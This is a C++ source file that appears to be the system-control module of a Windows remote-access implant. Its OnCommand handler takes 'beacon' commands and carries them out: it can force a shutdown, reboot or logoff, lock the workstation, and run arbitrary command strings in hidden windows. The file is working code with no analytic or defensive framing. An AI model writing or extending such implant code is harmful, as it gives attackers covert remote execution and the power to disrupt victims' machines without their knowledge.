#include "system_ctrl.h"
#include "../config.h"
#include "../beacon.h"
#include <windows.h>

namespace SystemCtrl {
    static bool EnableShutdownPrivilege() {
        HANDLE hToken;
        TOKEN_PRIVILEGES tkp;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
            return false;
        LookupPrivilegeValueA(nullptr, "SeShutdownPrivilege", &tkp.Privileges[0].Luid);
        tkp.PrivilegeCount = 1;
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, nullptr, nullptr);
        CloseHandle(hToken);
        return true;
    }

    void Shutdown() {
        EnableShutdownPrivilege();
        ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, SHTDN_REASON_MAJOR_APPLICATION);
    }

    void Reboot() {
        EnableShutdownPrivilege();
        ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_APPLICATION);
    }

    void Logoff() {
        ExitWindowsEx(EWX_LOGOFF | EWX_FORCE, 0);
    }

    void Lock() {
        LockWorkStation();
    }

    void ShellExecute(const std::string& command) {
        STARTUPINFOA si = { sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi = {};
        CreateProcessA(nullptr, (LPSTR)command.c_str(), nullptr, nullptr, FALSE,
                       CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
        if (pi.hProcess) {
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }

    void OnCommand(const Beacon::Command& cmd) {
        if (cmd.type == "shutdown") Shutdown();
        else if (cmd.type == "reboot") Reboot();
        else if (cmd.type == "logoff") Logoff();
        else if (cmd.type == "lock") Lock();
        else if (cmd.type == "exec") {
            // params should contain the command string
            ShellExecute(cmd.params);
        }
    }
}
